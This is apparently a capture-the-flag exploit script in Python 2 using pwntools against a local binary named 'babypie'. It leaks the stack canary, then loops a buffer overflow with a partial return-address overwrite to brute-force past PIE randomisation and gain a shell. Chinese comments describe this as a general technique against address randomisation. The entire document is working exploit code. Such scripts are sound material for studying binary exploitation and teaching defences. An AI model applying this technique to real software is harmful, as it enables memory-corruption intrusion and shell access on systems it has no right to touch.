#!/usr/bin/python
from pwn import *
while True:
    try:
        io = process("./babypie",timeout=1)
        payload1 = (0x30-8)*'a' + 'b'
        io.sendafter(":\n",payload1)
        io.recvuntil("b")
        cannary = '\0' + io.recvn(7)
        success(cannary.encode("hex"))
        payload2 = (0x30-8)*'a' + cannary + "fake_ebp" + "\x3E\x0A"
        io.sendafter(":\n",payload2)
        io.send("ls")
        print io.recv()
    except Exception as e:
        print e
        io.close()
#因为pie的低12位歧视不会变，再加上小端格式的原因，可以通过不断覆盖低十二位去撞
#比较通用的一种对付地址随机化的东西